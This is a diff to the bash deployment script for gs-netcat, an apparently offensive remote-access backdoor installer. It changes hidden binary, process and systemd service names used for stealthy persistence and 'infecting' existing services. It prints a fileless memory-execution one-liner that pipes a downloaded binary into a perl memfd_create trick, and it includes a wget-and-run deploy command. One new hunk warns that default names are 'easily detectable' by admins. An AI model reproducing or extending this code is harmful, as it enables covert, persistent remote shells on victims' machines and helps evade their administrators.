@@ -153,7 +153,7 @@ DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 bin_hidden_name_arr=("supervise" "restart" "usbmon" "fg" "bg")
 BIN_HIDDEN_NAME_DEFAULT="${bin_hidden_name_arr[$((RANDOM % ${#bin_hidden_name_arr[@]}))]}"
 
-service_hidden_name_arr=("supervise" "init" "restart" "monitor" "watchdog")
+service_hidden_name_arr=("supervise" "init" "restart" "monitor" "update")
 SERVICE_HIDDEN_NAME_DEFAULT="${service_hidden_name_arr[$((RANDOM % ${#service_hidden_name_arr[@]}))]}"
 
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
@@ -222,6 +222,7 @@ CONFIG_DIR_NAME_RM=("${config_dir_name_arr[@]}" "htop" "dbus")
 	CM="\033[1;35m" # magenta
 	CC="\033[1;36m" # cyan
 	CDR="\033[0;31m" # red
+	CDB="\033[0;34m" # blue
 	CDG="\033[0;32m" # green
 	CDY="\033[0;33m" # yellow
 	CDC="\033[0;36m" # cyan
@@ -599,11 +600,12 @@ try_dstdir()
 
 output_memexec() {
 	[[ "$OSNAME" != "linux" ]] && return
-	echo -e "\
-Alternativly, cut & paste the following to deploy to memory:
-${CDC}X=${CDY}SecretChangeMe${CDR}${CF} # ${CRY}<--- ${CRY}CHANGE THIS!${CN}
-${CDC}${DL[*]} ${URL_BIN}/${SRC_PKG} | \\"
-	echo 'GS_ARGS="-ilD -s ${X:?}" \'
+	echo -e "Alternativly, cut & paste the following to deploy to memory:"
+	[[ -z "$X" ]] && {
+		echo -e "${CDC}X=${CDY}SecretChangeMe${CDR} ${CRY}# <--- CHANGE THIS!${CN}"
+	}
+	echo -e "${CM}${DL[*]} ${URL_BIN}/${SRC_PKG} | \\"
+	echo "GS_ARGS=\"-ilD -s \${X:?}\" \\"
 	echo -n 'perl '"'"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'"'"' -- "$@"'
 	echo -e "${CN}"
 }
@@ -858,15 +860,15 @@ init_vars()
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
 
 	# Defaults
-	# Binary file is called gs-dbus or set to same name as Process name if
-	# GS_NAME is set. Can be overwritten with GS_BIN=
 	GS_BIN="$(basename "$GS_BIN")"
 	if [[ -n $GS_BIN ]]; then
 		BIN_HIDDEN_NAME="${GS_BIN}"
 		BIN_HIDDEN_NAME_RM+=("${GS_BIN}")
 		[[ -z $GS_SERVICE ]] && GS_SERVICE="$GS_BIN"
+		# Only check for _this_ binary to allow double installs
+		bin_hidden_name_arr=("${BIN_HIDDEN_NAME}")
 	else
-		BIN_HIDDEN_NAME="${GS_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+		BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
 	fi
 	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
 	
@@ -878,6 +880,7 @@ init_vars()
 	fi
 
 	CONFIG_DIR_NAME="${CONFIG_DIR_NAME_DEFAULT}"
+	[ -n "$DSTDIR" ] && unset config_dir_name_arr
 
 	SERVICE_HIDDEN_NAME="${GS_SERVICE:-$SERVICE_HIDDEN_NAME_DEFAULT}"
 	SERVICE_HIDDEN_NAME="${SERVICE_HIDDEN_NAME%%.*}"
@@ -1049,7 +1052,7 @@ init_setup()
 	[[ -n "$LDSO" ]] && DSTBIN_EXEC_ARR=("${LDSO}")
 	DSTBIN_EXEC_ARR+=("${DSTBIN}")
 
-	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
+	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. # ${BIN_HIDDEN_NAME}-kernel"
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -1193,15 +1196,13 @@ uninstall_service()
 
 	[[ ! -f "${sf}" ]] && return
 	[[ $UID -ne 0 ]] && {
-		echo -e "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
+		echo -e "${CDY}WARN${CN}: Disinfecting ${CDY}${sf}${CN}...FAILED. Need to be root."
 		return 255
 	}
 
 	command -v systemctl >/dev/null && {
 		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
-		# STOPPING would kill the current login shell. Do not stop it.
-		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+="systemctl stop ${sn};"
+		systemctl disable "${sn}" 2>/dev/null
 	}
 
 	if grep -Fqm1 oneshot "${sf}" 2>/dev/null; then
@@ -1266,6 +1267,7 @@ uninstall()
 		## Systemd's gs-dbus.dat
 		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
 	done
+	unset fn
 
 	for hn in "${SERVICE_HIDDEN_NAME}" "${service_hidden_name_arr[@]}"; do
 		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
@@ -1412,6 +1414,16 @@ gs_secret_reload_systemd_infect() {
 gs_secret_load_user() {
 	local f d
 
+	[ -n "$GS_DSTDIR" ] && {
+		for f in "${bin_hidden_name_arr[@]}"; do
+			fn="${GS_PREFIX}${GS_DSTDIR}/${f}"
+			DEBUGF "Checking ${fn}"
+			[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+		done
+
+		return 255
+	}
+
 	for d in "${config_dir_name_arr[@]}"; do
 		for f in "${bin_hidden_name_arr[@]}"; do
 			fn="${GS_PREFIX}${HOME}/.config/${d}/${f}"
@@ -1424,8 +1436,11 @@ gs_secret_load_user() {
 }
 
 gs_secret_load_system() {
+	local d
+
+	d="${GS_DSTDIR:-/usr/sbin}"
 	for f in "${bin_hidden_name_arr[@]}"; do
-		fn="/usr/sbin/${f}"
+		fn="${d}/${f}"
 		DEBUGF "Checking ${fn}"
 		[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
 	done
@@ -1433,24 +1448,7 @@ gs_secret_load_system() {
 	return 255
 }
 
-# Try to load a GS_SECRET
-gs_secret_reload() {
-	local load_ok fn f d
-	gs_secret_reload_systemd_infect && load_ok=1
-	
-	[[ -z $load_ok ]] && {
-		# systemd-install not found.
-		# Try to load from binary if it exists:
-		[[ -f "${DSTBIN:?}" ]] && bin2config "${DSTBIN}" "${DSTBIN}" && load_ok=1
-
-
-		[[ -z "$GS_DSTDIR" ]] && [[ -z "$GS_BIN" ]] && {
-			[[ -z "$load_ok" ]] && gs_secret_load_user && load_ok=1
-			[[ -z "$load_ok" ]] && gs_secret_load_system && load_ok=1
-		}
-	}
-	[[ -z "$load_ok" ]] && return 255
-
+exit_installed() {
 	WARN "Already installed."
 
 	GS_SECRET="$GS_CONFIG_SECRET"
@@ -1461,6 +1459,21 @@ gs_secret_reload() {
 	show_install_config
 	HOWTO_CONNECT_OUT
 	exit_code 0
+}
+
+# Try to load a GS_SECRET
+gs_secret_reload() {
+	local load_ok fn f d
+	gs_secret_reload_systemd_infect && exit_installed
+
+	# systemd-install not found.
+	# Try to load from binary if it exists:
+	# User may set DSTDIR= and GS_NAME=
+	[[ -f "${DSTBIN:?}" ]] && bin2config "${DSTBIN}" "${DSTBIN}" && exit_installed
+
+	# If GS_DSTDIR is set then look _only_ in the GS_DSTDIR
+	gs_secret_load_user && exit_installed
+	gs_secret_load_system && exit_installed
 }
 
 # Return 200 if already infected.
@@ -1515,9 +1528,11 @@ do_config2bin() {
 install_systemd_add() {
 	local sfdata="$1"
 	local param="$2"
+	local len="70"
 	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || return 255
 
-	printf "%-70.70s" "Installing as systemd ${SERVICE_HIDDEN_NAME}.service.............................................."
+	[[ -n "$CDC" ]] && ((len+=11)) 
+	printf "%-${len}.${len}s" "$(echo -e "Installing as systemd ${CB}${SERVICE_HIDDEN_NAME}.service${CN}..............................................")"
 
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		((IS_INSTALLED+=1))
@@ -1608,7 +1623,7 @@ install_systemd_infect() {
 	# recover if this fails:
 	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || return 255
 
-	STARTING_STR="Starting gs-netcat as infected '${name}.service'"
+	STARTING_STR="Starting gs-netcat as infected ${CDB}${name}.service${CN}${CDC}${CN}"
 }
 
 install_system_systemd()
@@ -1973,7 +1988,7 @@ do_webhook()
 show_install_config() {
 	local str
 	[[ -n $INFECTED_BIN_NAME ]] && echo -e "Infected: ${CDG}${INFECTED_BIN_NAME}${CN}"
-	[[ -n $DSTBIN ]]            && echo -e "Binary  : ${CDG}${DSTBIN}${CN} ${CF}[GS_BIN= to change]${CN}"
+	[[ -n $DSTBIN ]]            && echo -e "Binary  : ${CDG}${CF}${DSTBIN%/*}/${CN}${CDG}${DSTBIN##*/}${CN} ${CF}[GS_BIN= to change]${CN}"
 	[[ -n $GS_HOST ]]           && echo -e "Relay   : ${CDG}${GS_HOST}:${GS_PORT:-443}${CN}"
 	[[ -z $SYSTEMD_INFECTED_NAME ]] && [[ -n $PROC_HIDDEN_NAME ]] && {
 		echo -e "Name    : ${CDG}${PROC_HIDDEN_NAME}${CN} ${CF}[GS_NAME= to change]${CN}"
@@ -2137,7 +2152,9 @@ gs_start()
 	local old_pid
 	[[ -n $IS_GS_RUNNING ]] && return
 
-	printf "%-70.70s" "${STARTING_STR}....................................................."
+	local len=70
+	[[ -n "$CDC" ]] && ((len+=22)) 
+	printf "%-${len}.${len}s" "$(echo -e "${STARTING_STR}.....................................................")"
 	if [[ -n "$GS_NOSTART" ]]; then
 		SKIP_OUT "${CDC}GS_NOSTART=1${CN} is set."
 		return
@@ -2198,7 +2215,7 @@ else
 	URL_BIN="$URL_BIN_FULL"
 fi
 
-STARTING_STR="Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'"
+STARTING_STR="Starting ${CB}${BIN_HIDDEN_NAME}${CN} as hidden process ${CDC}${PROC_HIDDEN_NAME}${CN}"
 install "$OSARCH" "$SRC_PKG"
 
 WARN_EXECFAIL
@@ -2253,5 +2270,11 @@ gs_start
 [[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
 
 echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+
+# Default values are known and easily detected by users/admins.
+unset is_warn
+[ "$UID" -eq 0 ] && [ -z "$GS_SUPERVISE" ] && is_warn=1
+[ -z "$GS_BIN" ] && is_warn=1
+[ -n "$is_warn" ] && WARN "Using default names is easily detectable.\n             Set ${CDC}GS_BIN=<filename>${CN} and ${CDC}GS_NAME=<processname>${CN} instead."
 
 exit_code 0
